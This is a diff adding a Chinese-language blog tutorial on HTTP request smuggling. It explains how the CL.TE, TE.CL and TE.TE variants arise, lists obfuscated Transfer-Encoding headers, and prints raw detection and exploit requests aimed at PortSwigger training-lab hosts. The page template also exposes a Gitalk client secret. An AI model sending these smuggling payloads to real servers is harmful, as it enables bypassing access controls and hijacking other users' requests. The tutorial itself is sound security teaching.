@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>HTTP Request Smuggling | Twe1ve&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <meta name="description" content="HTTP请求走私（HTTP Request Smuggling） 原理：HTTP规范提供了两种不同的方法来指定HTTP消息的长度，但是单个消息可能会同时使用这两种方法，从而使它们彼此冲突 HTTP规范中如果Content-Length和Transfer-Encoding标头同时存在，则Content-Length无效，在单个服务器时有效避免了冲突，但是当多个服务器时，由于服务器之间理解的不一致导致">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP Request Smuggling">
+<meta property="og:url" content="https://github.com/2020/06/02/HTTP-Request-Smuggling/index.html">
+<meta property="og:site_name" content="Twe1ve&#39;s Blog">
+<meta property="og:description" content="HTTP请求走私（HTTP Request Smuggling） 原理：HTTP规范提供了两种不同的方法来指定HTTP消息的长度，但是单个消息可能会同时使用这两种方法，从而使它们彼此冲突 HTTP规范中如果Content-Length和Transfer-Encoding标头同时存在，则Content-Length无效，在单个服务器时有效避免了冲突，但是当多个服务器时，由于服务器之间理解的不一致导致">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/2020/06/02/HTTP-Request-Smuggling/1.png">
+<meta property="og:image" content="https://github.com/2020/06/02/HTTP-Request-Smuggling/2.png">
+<meta property="og:image" content="https://github.com/2020/06/02/HTTP-Request-Smuggling/3.png">
+<meta property="og:image" content="https://github.com/2020/06/02/HTTP-Request-Smuggling/4.png">
+<meta property="og:image" content="https://github.com/2020/06/02/HTTP-Request-Smuggling/5.png">
+<meta property="article:published_time" content="2020-06-02T02:34:05.000Z">
+<meta property="article:modified_time" content="2020-06-02T02:49:19.532Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2020/06/02/HTTP-Request-Smuggling/1.png">
+  
+    <link rel="icon" href="/images/icon.png">
+  
+  
+<link rel="stylesheet" href="/css/index.css">
+
+
+
+  <!-- 百度站長統計-->
+  
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?f4e4f3d9d2532faa71e451f2ab41cbb6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Twe1ve's Blog" type="application/atom+xml">
+</head>
+
+<div class="main height-100 flex flex-v">
+  <div class="phone-header">
+    <a to="/home" class="mobile-logo" > <img src="/images/logo.svg" /> </a>
+    <a class="menu iconfont icon-menu" onclick="toggleMenu()"></a>
+  </div>
+  <div class="main-top flex flex1">
+    <nuxt-link  to="/home" class="mobile-nav-btn iconfont icon-fenlei"></nuxt-link>
+    <!--主页上左部分-->
+    <div class="height-100 main-left  flex flex-v">
+      <div class="main-left-top flex1">
+        <a class="logo">
+          <img src="/images/logo.svg" />
+          <div class="sub-title">废物Twe1ve的垃圾展示台</div>
+        </a>
+        <nav class="nav">
+
+  
+    
+      <a title="首页"  alt="首页"  v-for="(menu,index) in menus" href="/">
+        <div class="icon"><i class="iconfont icon-home"></i></div>
+        <div class="name">
+          <div class="cnname">首页</div>
+          <div class="enname">Home Page</div>
+        </div>
+      </a>
+
+    
+      <a title="归档"  alt="归档"  v-for="(menu,index) in menus" href="/archives">
+        <div class="icon"><i class="iconfont icon-archives"></i></div>
+        <div class="name">
+          <div class="cnname">归档</div>
+          <div class="enname">Archive Page</div>
+        </div>
+      </a>
+
+    
+      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="./../about">
+        <div class="icon"><i class="iconfont icon-about"></i></div>
+        <div class="name">
+          <div class="cnname">关于我</div>
+          <div class="enname">About Me</div>
+        </div>
+      </a>
+
+    
+  
+
+  <!--<a href="/link/">
+    <div class="icon"><i class="iconfont icon-link"></i></div>
+    <div class="name">
+      <div class="cnname">友情链接</div>
+      <div class="enname">Friends Web Link</div>
+    </div>
+  </a>-->
+</nav>
+
+      </div>
+
+      <view class="website-msg">
+        <div class="beian"><a target="_blank" href="http://www.miitbeian.gov.cn/"></a></div>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <div class="beian"><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></div>
+        <!--
+        <div class="theme-drsc">PowerBy:<a href="https://hexo.io" target="_blank">Hexo</a> ThemeBy:<a href="" target="_blank">Soul</a></div>
+        -->
+        <div class="copyright">Copyright &#169 <a href="mailto:yorojogame@gmail.com">2020 Twe1ve&#39;s Blog</a> </div>
+      </view>
+
+      <div class="social flex flex-align-center ">
+        
+          
+            
+          
+        
+      </div>
+    </div>
+    <!--主页上右部分-->
+    <div class="main-right flex1 flex flex-v">
+    <div class="article-content flex1">
+        <div class="article-content-container">
+            <div class="article-title row">
+                <div class="title">HTTP Request Smuggling</div>
+                <div class=" other">
+                    <!--<i class="iconfont icon-iconfontordinaryliulan"></i> 56--> <i
+                        class="iconfont icon-shijian"></i>· Jun 2, 2020 ·</div>
+            </div>
+            <div class="article-message markdown-body">
+                <article class="text" v-highlight>
+                    <p><strong>HTTP请求走私（HTTP Request Smuggling）</strong></p>
+<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>HTTP规范提供了两种不同的方法来指定HTTP消息的长度，但是单个消息可能会同时使用这两种方法，从而使它们彼此冲突</p>
+<p>HTTP规范中如果Content-Length和Transfer-Encoding标头同时存在，则Content-Length无效，在单个服务器时有效避免了冲突，但是当多个服务器时，由于服务器之间理解的不一致导致了HTTP Request Smuggling<br>如果前端服务器和后端服务器相对于（可能是混淆的）Transfer-Encoding 标头而言行为不同，则它们可能在连续请求之间的边界上存在分歧，从而导致请求走私漏洞</p>
+<p>这也意味着如果网站没有负载平衡，CDN和反向代理，则不会产生HTTP Request Smuggling。引入的代理层越多，越容易受到HTTP Request Smuggling攻击</p>
+<p><img src="1.png" alt=""></p>
+<h2 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h2><p>Content-Length指的就是用 POST Method时带入的 data 的长度（此长度不包含\r\n）</p>
+<pre><code>POST /search HTTP/1.1
+Host: xxxxxxxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+q=smuggling</code></pre><h2 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h2><pre><code>POST /search HTTP/1.1
+Host: xxxxxxxx
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+b---&gt; data长度，十六进制
+q=smuggling---&gt;data
+0---&gt;结束符，后接\r\n\r\n</code></pre><h2 id="Keep-Alive"><a href="#Keep-Alive" class="headerlink" title="Keep Alive##"></a>Keep Alive##</h2><p>在HTTP1.1中默认使用keep alive，从而允许在单个连接上承载多个请求和响应<br>所谓Keep-Alive，就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在HTTP1.1中是默认开启的。</p>
+<p>相反，HTTP请求中带有Connection: close的话，通信完成之后，服务器会中断 TCP 连接</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>能够绕过安全机制，实施未授权访问，获取敏感信息并直接危害其他用户</p>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><ul>
+<li>CL.TE：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。</li>
+<li>TE.CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li>
+<li>TE.TE：前端服务器和后端服务器均支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。   </li>
+</ul>
+<pre><code>Transfer-Encoding: xchunked
+
+
+Transfer-Encoding : chunked
+
+
+Transfer-Encoding: chunked
+
+Transfer-Encoding: x
+
+
+
+Transfer-Encoding:[tab]chunked
+
+
+
+[space]Transfer-Encoding: chunked
+
+
+
+X: X[\n]Transfer-Encoding: chunked
+
+
+
+Transfer-Encoding
+
+: chunked</code></pre><h2 id="漏洞检测-amp-验证-amp-利用"><a href="#漏洞检测-amp-验证-amp-利用" class="headerlink" title="漏洞检测&amp;验证&amp;利用"></a>漏洞检测&amp;验证&amp;利用</h2><p><img src="2.png" alt=""></p>
+<p>需要关闭自动更新Content-Length功能：</p>
+<p><img src="3.png" alt=""></p>
+<p><strong>漏洞检测：</strong></p>
+<pre><code>POST / HTTP/1.1
+Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+Q</code></pre><p>上边构造的payload，Q并不在长度范围内，前端并不会处理到Q，而此时后端会等待下一个块大小超时；因此会有明显的时间延迟<br>如果两个服务器都处于同步状态（TE.TE或CL.CL），则该请求将被前端拒绝，或者被两个系统无害处理。最后，如果以相反的方式发生同步（TE.CL），则由于无效的块大小’Q’，前端将拒绝该消息，而不会将其转发到后端。这样可以防止后端套接字中毒。</p>
+<p><strong>检测TE.CL</strong></p>
+<pre><code>POST / HTTP/1.1
+Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G</code></pre><p>0终止符后，后端将超时，等待X到达</p>
+<p><strong>两种数据包比较：</strong></p>
+<p><img src="4.png" alt=""></p>
+<p><strong>漏洞验证</strong></p>
+<p><img src="5.png" alt=""></p>
+<p><strong>漏洞利用：</strong>(发包需要多试几次)</p>
+<p>CL.TE:</p>
+<pre><code>POST / HTTP/1.1
+Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G</code></pre><p>TE.CL:</p>
+<pre><code>POST / HTTP/1.1
+Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0</code></pre><p>终止符0后边接 \r\n\r\n</p>
+<p>TE.TE：</p>
+<pre><code>POST / HTTP/1.1
+Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: xxx
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+x=1
+0</code></pre><p>多种利用案例<br>靶场：<a href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting</a>  </p>
+<p>案例视频讲解： <a href="https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4&amp;pbjreload=10" target="_blank" rel="noopener">https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4&amp;pbjreload=10</a></p>
+<p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">https://xz.aliyun.com/t/6878</a> —&gt;内含很多利用案例</p>
+<p><a href="https://www.youtube.com/watch?v=kgkRih2MQtU" target="_blank" rel="noopener">https://www.youtube.com/watch?v=kgkRih2MQtU</a></p>
+<p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling</a></p>
+<p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a> 内含很多利用案例</p>
+
+                </article>
+            </div>
+            <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<style>
+    .hljs {
+        display: block !important;
+        overflow-x: auto !important;
+        background: #2b2b2b !important;
+        color: #f8f8f2 !important;
+        padding: .5em !important;
+    }
+</style>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '85810192d72d7f763a9a',
+        clientSecret: 'e9867192041e53ad9f4581db6e50bbe7373a090d',
+        repo: 'myblog',
+        owner: 'callmesoul',
+        admin: ['callmesoul'],
+        id: '', // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+        </div>
+    </div>
+</div>
+
+<link href="https://cdn.bootcss.com/highlight.js/9.15.7/styles/a11y-dark.min.css" rel="stylesheet">
+<script src="https://cdn.bootcss.com/highlight.js/9.15.9/highlight.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+        document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+        });
+    });
+</script>
+  </div>
+  <!--
+  <div class="main-bottom">
+    <div class="music flex flex-pack-justify flex-align-center">
+      <div class="control">
+        <a onclick="preSong()"><span class="iconfont icon-shangyishou"></span></a>
+        <a onclick="playControl()"><span class="iconfont play-icon icon-kaishi1"></span></a>
+        <a onclick="nextSong()"><span class="iconfont icon-xiayishou-copy"></span></a>
+      </div>
+      <div class="msg">
+        <span class="time"></span>
+        <div class="line" ref="progress-line-warp">
+          <div class="song-msg">周杰伦 - 说好不哭</div>
+          <!--<div class="current-line" ref="progress-line">
+            <a tag="a" class="target" v-on:mousedown.prevent="mousedown"></a>
+          </div>-->
+        </div>
+        <span class="all-time"></span>
+      </div>
+      <div class="right-control">
+        <a class="order-btn flex flex-align-center" onclick="toogleShowMusicList()">
+          <span class="iconfont icon-ttpodicon"></span>
+          <span class="number flex1">3</span>
+        </a>
+      </div>
+      <audio id="audio" class="mian-audio" src="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3">
+        Your browser does not support the audio element.
+      </audio>
+    </div>
+  </div>
+  <div class="music-list">
+    <div id="musiclist">
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 说好不哭" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3" onclick="changePlayIndex(0)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">说好不哭 - 周杰伦</span>
+        </a>
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 爱在西元前" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E7%88%B1%E5%9C%A8%E8%A5%BF%E5%85%83%E5%89%8D%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(1)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">爱在西元前 - 周杰伦</span>
+        </a>
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 龙拳" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E9%BE%99%E6%8B%B3%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(2)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">龙拳 - 周杰伦</span>
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+<script>
+  var playIndex = localStorage.getItem('playIndex') ? parseInt(localStorage.getItem('playIndex')) : 0
+  let musics = $('.music-item')
+  musics.eq(playIndex).addClass('active')
+  var audio = document.getElementById("audio");
+
+  $('.song-msg').html(musics[playIndex].dataset.name)
+  audio.src = musics[playIndex].dataset.url
+
+
+  var playbtn = document.getElementsByClassName("play-icon")[0];
+  var playing = false;
+  audio.loop = false;
+  audio.addEventListener('ended', function () {
+    playbtn.classList.remove("icon-kaishi")
+    playbtn.classList.add("icon-kaishi1")
+    playing = false
+  }, false);
+  audio.addEventListener('play', function () {
+    playbtn.classList.remove("icon-kaishi1")
+    playbtn.classList.add("icon-kaishi")
+    playing= true
+  }, false);
+  audio.addEventListener('pause', function () {
+    playbtn.classList.remove("icon-kaishi")
+    playbtn.classList.add("icon-kaishi1")
+    playing = false
+  }, false);
+  function toogleShowMusicList() {
+    var musiclist = document.getElementsByClassName("music-list")[0];
+    if(musiclist.className.indexOf("active") === -1){
+      musiclist.classList.add("active")
+    }else{
+      musiclist.classList.remove("active");
+    }
+  }
+
+  function playControl() {
+    if(playing){
+      audio.pause()
+    }else{
+      audio.play()
+    }
+  }
+
+  function changePlayIndex(index) {
+    if(playIndex !== index){
+      localStorage.setItem('playIndex',index)
+      playIndex = index
+      musics.removeClass('active')
+      musics.eq(playIndex).addClass('active')
+      $('.song-msg').html(musics[playIndex].dataset.name)
+      audio.src = musics[playIndex].dataset.url
+      audio.play()
+    }else{
+      playControl()
+    }
+  }
+
+  function preSong() {
+    var index
+    if(playIndex === 0){
+      index = musics.length - 1
+    }else{
+      index = playIndex - 1
+    }
+    changePlayIndex(index)
+  }
+
+  function nextSong() {
+    var index
+    if(playIndex === musics.length - 1){
+      index = 0
+    }else{
+      index = playIndex + 1
+    }
+    changePlayIndex(index)
+  }
+-->
+  function toggleMenu() {
+    var mainLeft = $('.main-left')
+    if(mainLeft.hasClass('active')){
+      mainLeft.removeClass('active')
+      $('.menu').removeClass('icon-close')
+      $('.menu').addClass('icon-menu')
+    }else{
+      mainLeft.addClass('active')
+      $('.menu').removeClass('icon-menu')
+      $('.menu').addClass('icon-close')
+    }
+  }
+</script>
